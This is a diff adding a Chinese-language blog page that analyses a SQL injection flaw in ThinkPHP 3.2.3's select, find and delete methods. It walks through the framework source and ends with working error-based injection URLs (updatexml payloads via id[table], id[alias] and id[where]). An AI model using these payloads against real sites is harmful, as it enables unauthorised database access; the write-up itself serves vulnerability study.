@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞一、漏洞简介二、漏洞影响&lt;&#x3D; 3.2.3 三、复现过程漏洞分析通过github上的commit对比其实可以粗略知道，此次更新主要是在ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php文件中，其中对于delete，find，select三个函数进行了修改。 delete函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞一、漏洞简介二、漏洞影响&lt;&#x3D; 3.2.3 三、复现过程漏洞分析通过github上的commit对比其实可以粗略知道，此次更新主要是在ThinkPHP&#x2F;Library&#x2F;Think&#x2F;Model.class.php文件中，其中对于delete，find，select三个函数进行了修改。 delete函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="article:published_time" content="2022-07-08T06:26:04.461Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 3.x 漏洞/Thinkphp_3.2.3_select&amp;find&amp;delete注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:04.461Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-3-2-3-select-amp-find-amp-delete-注入漏洞"><a href="#Thinkphp-3-2-3-select-amp-find-amp-delete-注入漏洞" class="headerlink" title="Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞"></a>Thinkphp 3.2.3 select&amp;find&amp;delete 注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>&lt;= 3.2.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过github上的commit<br>对比其实可以粗略知道，此次更新主要是在<code>ThinkPHP/Library/Think/Model.class.php</code>文件中，其中对于<code>delete</code>，<code>find</code>，<code>select</code>三个函数进行了修改。</p>
+<p><code>delete</code>函数</p>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><code>select</code>函数</p>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p><code>find</code>函数</p>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>对比三个方法修改的地方都有一个共同点：</p>
+<blockquote>
+<p>把外部传进来的<code>$options</code>，修改为<code>$this-&gt;options</code>，同时不再使用<code>$this-&gt;_parseOptions</code>对于<code>$options</code>进行表达式分析。</p>
+</blockquote>
+<p>思考是因为<code>$options</code>可控，再经过<code>_parseOptions</code>函数之后产生了sql注入。</p>
+<h3 id="一-select-和-find-函数"><a href="#一-select-和-find-函数" class="headerlink" title="一 select 和 find 函数"></a>一 select 和 find 函数</h3><p>以<code>find</code>函数为例进行分析（<code>select</code>代码类似），该函数可接受一个<code>$options</code>参数，作为查询数据的条件。</p>
+<p>当<code>$options</code>为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：</p>
+<pre><code>if (is_numeric($options) || is_string($options)) &#123;
+            $where[$this-&gt;getPk()] = $options;
+            $options               = array();
+            $options[&#39;where&#39;]      = $where;
+&#125;
+</code></pre>
+<p>同时提供了对复合主键的查询，看到判断：</p>
+<pre><code>if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) &#123;
+            // 根据复合主键查询
+            ......
+        &#125;
+</code></pre>
+<p>要进入复合主键查询代码，需要满足<code>$options</code>为数组同时<code>$pk</code>主键也要为数组，但这个对于表只设置一个主键的时候不成立。</p>
+<p>那么就可以使<code>$options</code>为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入<code>_parseOptions</code>进行解析。</p>
+<pre><code>if (is_numeric($options) || is_string($options)) &#123;//$options为数组不进入
+            $where[$this-&gt;getPk()] = $options;
+            $options               = array();
+            $options[&#39;where&#39;]      = $where;
+        &#125;
+        // 根据复合主键查找记录
+        $pk = $this-&gt;getPk();
+        if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) &#123; //$pk不为数组不进入
+            ......
+        &#125;
+        // 总是查找一条记录
+        $options[&#39;limit&#39;] = 1;
+        // 分析表达式
+        $options = $this-&gt;_parseOptions($options); //解析表达式
+        // 判断查询缓存
+        .....
+        $resultSet = $this-&gt;db-&gt;select($options); //底层执行
+</code></pre>
+<p>之后跟进<code>_parseOptions</code>方法，（分析见代码注释）</p>
+<pre><code>if (is_array($options)) &#123; //当$options为数组的时候与$this-&gt;options数组进行整合
+            $options = array_merge($this-&gt;options, $options);
+        &#125;
+
+        if (!isset($options[&#39;table&#39;])) &#123;//判断是否设置了table 没设置进这里
+            // 自动获取表名
+            $options[&#39;table&#39;] = $this-&gt;getTableName();
+            $fields           = $this-&gt;fields;
+        &#125; else &#123;
+            // 指定数据表 则重新获取字段列表 但不支持类型检测
+            $fields = $this-&gt;getDbFields(); //设置了进这里
+        &#125;
+
+        // 数据表别名
+        if (!empty($options[&#39;alias&#39;])) &#123;//判断是否设置了数据表别名
+            $options[&#39;table&#39;] .= &#39; &#39; . $options[&#39;alias&#39;]; //注意这里，直接拼接了
+        &#125;
+        // 记录操作的模型名称
+        $options[&#39;model&#39;] = $this-&gt;name;
+
+        // 字段类型验证
+        if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;])) &#123; //让$optison[&#39;where&#39;]不为数组或没有设置不进这里
+            // 对数组查询条件进行字段类型检查
+           ......
+        &#125;
+        // 查询过后清空sql表达式组装 避免影响下次查询
+        $this-&gt;options = array();
+        // 表达式过滤
+        $this-&gt;_options_filter($options);
+        return $options;
+</code></pre>
+<p><code>$options</code>我们可控，那么就可以控制为数组类型，传入<code>$options[&#39;table&#39;]</code>或<code>$options[&#39;alias&#39;]</code>等等，只要提层不进行过滤都是可行的。</p>
+<p>同时我们可以不设置<code>$options[&#39;where&#39;]</code>或者设置<code>$options[&#39;where&#39;]</code>的值为字符串，可绕过字段类型的验证。</p>
+<p>可以看到在整个对<code>$options</code>的解析中没有过滤，直接返回，跟进到底层<code>ThinkPHP\Libray\Think\Db\Diver.class.php</code>，找到<code>select</code>方法，继续跟进最后来到<code>parseSql</code>方法，对<code>$options</code>的值进行替换，解析。</p>
+<p>因为<code>$options[&#39;table&#39;]</code>或<code>$options[&#39;alias&#39;]</code>都是由<code>parseTable</code>函数进行解析，跟进：</p>
+<pre><code>if (is_array($tables)) &#123;//为数组进
+            // 支持别名定义
+          ......
+        &#125; elseif (is_string($tables)) &#123;//不为数组进
+            $tables = array_map(array($this, &#39;parseKey&#39;), explode(&#39;,&#39;, $tables));
+        &#125;
+        return implode(&#39;,&#39;, $tables);
+</code></pre>
+<p>当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。</p>
+<p>同时<code>$options[&#39;where&#39;]</code>也一样，看到<code>parseWhere</code>函数</p>
+<pre><code>$whereStr = &#39;&#39;;
+        if (is_string($where)) &#123;
+            // 直接使用字符串条件
+            $whereStr = $where; //直接返回了，没有任何过滤
+        &#125; else &#123;
+            // 使用数组表达式
+           ......
+        &#125;
+        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
+</code></pre>
+<h3 id="二-delete函数"><a href="#二-delete函数" class="headerlink" title="二 delete函数"></a>二 delete函数</h3><p><code>delete</code>函数有些不同，主要是在解析完<code>$options</code>之后，还对<code>$options[&#39;where&#39;]</code>判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。</p>
+<pre><code>......
+        // 分析表达式
+        $options = $this-&gt;_parseOptions($options);
+        if (empty($options[&#39;where&#39;])) &#123; //注意这里，还判断了一下$options[&#39;where&#39;]是否为空，为空直接返回，不再执行下面的代码。
+            // 如果条件为空 不进行删除操作 除非设置 1=1
+            return false;
+        &#125;
+        if (is_array($options[&#39;where&#39;]) &amp;&amp; isset($options[&#39;where&#39;][$pk])) &#123;
+            $pkValue = $options[&#39;where&#39;][$pk];
+        &#125;
+
+        if (false === $this-&gt;_before_delete($options)) &#123;
+            return false;
+        &#125;
+        $result = $this-&gt;db-&gt;delete($options);
+        if (false !== $result &amp;&amp; is_numeric($result)) &#123;
+            $data = array();
+            if (isset($pkValue)) &#123;
+                $data[$pk] = $pkValue;
+            &#125;
+
+            $this-&gt;_after_delete($data, $options);
+        &#125;
+        // 返回删除记录个数
+        return $result;
+</code></pre>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>针对<code>select()</code> 和<code>find()</code>方法<br>,有很多地方可注，这里主要列举三个<code>table</code>，<code>alias</code>，<code>where</code>，更多还请自行跟踪一下<code>parseSql</code>的各个<code>parseXXX</code>方法，目测都是可行的，比如<code>having</code>,<code>group</code>等。</p>
+<pre><code>table：http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+
+alias：http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+
+where: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+</code></pre>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>而<code>delete()</code>方法的话同样，这里粗略举三个例子，<code>table</code>,<code>alias</code>,<code>where</code>，但使用<code>table</code>和<code>alias</code>的时候，同时还必须保证<code>where</code>不为空（详细原因后面会说）</p>
+<pre><code>where: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+
+alias: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+
+table: http://www.0-sec.org/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1
+</code></pre>
+<p><img src="/resource/Thinkphp3.2.3select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2629#toc-1">https://xz.aliyun.com/t/2629#toc-1</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_select&find&delete%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwh800hny8v1hxxwbwgr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.2.3_update%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
